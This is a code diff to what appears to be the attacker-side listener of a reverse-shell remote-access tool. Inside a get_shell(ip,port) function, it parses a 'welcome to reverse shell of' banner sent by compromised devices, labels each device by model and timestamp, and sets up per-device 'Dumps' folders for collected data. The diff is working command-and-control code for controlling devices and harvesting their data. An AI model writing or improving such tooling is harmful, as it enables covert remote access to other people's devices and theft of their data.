@@ -736,12 +736,50 @@ def get_shell(ip,port):
             sys.exit(0)
         
         try:
-            # Create device-specific folder using IP address
-            device_ip = addr[0].replace('.', '_')
-            device_folder = f"Dumps/device_{device_ip}"
+            # Wait for and read the welcome message to get device info
+            welcome_msg = ""
+            device_identifier = None
+            
+            try:
+                # Read the welcome message that contains device model
+                conn.settimeout(5.0)  # Short timeout for welcome message
+                welcome_data = conn.recv(1024).decode("UTF-8")
+                
+                if "welcome to reverse shell of" in welcome_data:
+                    # Extract device model from welcome message
+                    model_part = welcome_data.split("welcome to reverse shell of")[1].strip()
+                    device_model = model_part.replace("\n", "").replace(" ", "_")
+                    
+                    # Add timestamp for uniqueness in case same model connects multiple times
+                    timestamp = time.strftime("%Y%m%d_%H%M%S")
+                    device_identifier = f"{device_model}_{timestamp}"
+                    
+                    # Clean up the identifier - remove invalid characters
+                    device_identifier = "".join(c for c in device_identifier if c.isalnum() or c in "_-")
+                    
+                    print(stdOutput("info")+f"Device identified: {model_part.strip()}")
+                    welcome_msg = welcome_data
+                    
+            except Exception as e:
+                print(stdOutput("warning")+f"Could not read welcome message: {e}")
+            
+            # Fallback naming with IP and timestamp for uniqueness
+            if not device_identifier:
+                device_ip = addr[0].replace('.', '_')
+                timestamp = time.strftime("%Y%m%d_%H%M%S")
+                device_identifier = f"device_{device_ip}_{timestamp}"
+                print(stdOutput("info")+f"Using fallback identifier: {device_identifier}")
+            
+            # Create device folder
+            device_folder = f"Dumps/{device_identifier}"
             if not os.path.exists(device_folder):
                 os.makedirs(device_folder)
                 print(stdOutput("info")+f"Created device folder: {device_folder}")
+            else:
+                print(stdOutput("info")+f"Using existing device folder: {device_folder}")
+            
+            # Reset timeout for normal operations
+            conn.settimeout(10.0)
             
             # Show previously completed commands
             if completed_commands:
